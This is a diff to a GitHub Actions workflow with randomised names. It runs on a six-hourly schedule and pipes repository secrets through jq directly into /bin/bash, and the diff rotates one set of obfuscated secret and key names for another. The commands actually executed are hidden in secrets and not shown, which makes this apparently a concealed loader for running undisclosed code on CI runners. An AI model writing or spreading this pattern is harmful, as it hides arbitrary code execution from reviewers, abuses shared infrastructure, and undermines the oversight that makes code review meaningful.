@@ -2,7 +2,7 @@ name: guyindu0918
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 3/6 * * *'
+    - cron: '27 2/6 * * *'
 
 jobs:
   build:
@@ -11,20 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: guyindu0918
         env:
-          zhez2917: ${{ secrets.zhez2917 }}
+          cewo27616: ${{ secrets.cewo27616 }}
         run: |
-          echo $zhez2917 | jq -r .e48478 | /bin/bash
-          echo $wb5450 | jq -r .ajv7522 | /bin/bash
-          echo $uemcm2108 | jq -r .wwkqj819 | /bin/bash
-          echo $che0820 | jq -r .lom915 | /bin/bash
-          echo $sxec94594 | jq -r .c4428 | /bin/bash
-          echo $uhcc6662 | jq -r .w880 | /bin/bash
-          echo $cvn739 | jq -r .jdu29436 | /bin/bash
-          echo $uqwpu5 | jq -r .bafi7206 | /bin/bash
-          echo $kou7 | jq -r .chey120 | /bin/bash
-          echo $rgi05 | jq -r .cyfb66749 | /bin/bash
-          echo $rr4 | jq -r .beoy549 | /bin/bash
-          echo $sg1 | jq -r .vd2 | /bin/bash
-          echo $jxw5725 | jq -r .ep5086 | /bin/bash
-          echo $dnq43 | jq -r .hqta673 | /bin/bash
+          echo $cewo27616 | jq -r .nwtax4291 | /bin/bash
+          echo $jqk3 | jq -r .wf182 | /bin/bash
+          echo $sd47 | jq -r .rcc056 | /bin/bash
+          echo $ie910 | jq -r .bxapu8640 | /bin/bash
+          echo $xgzbk56 | jq -r .kky885 | /bin/bash
+          echo $zm7366 | jq -r .e86 | /bin/bash
+          echo $x721 | jq -r .nsn96 | /bin/bash
+          echo $la29076 | jq -r .g2 | /bin/bash
+          echo $xh7 | jq -r .eptv454 | /bin/bash
+          echo $gbor349 | jq -r .mypok20 | /bin/bash
 
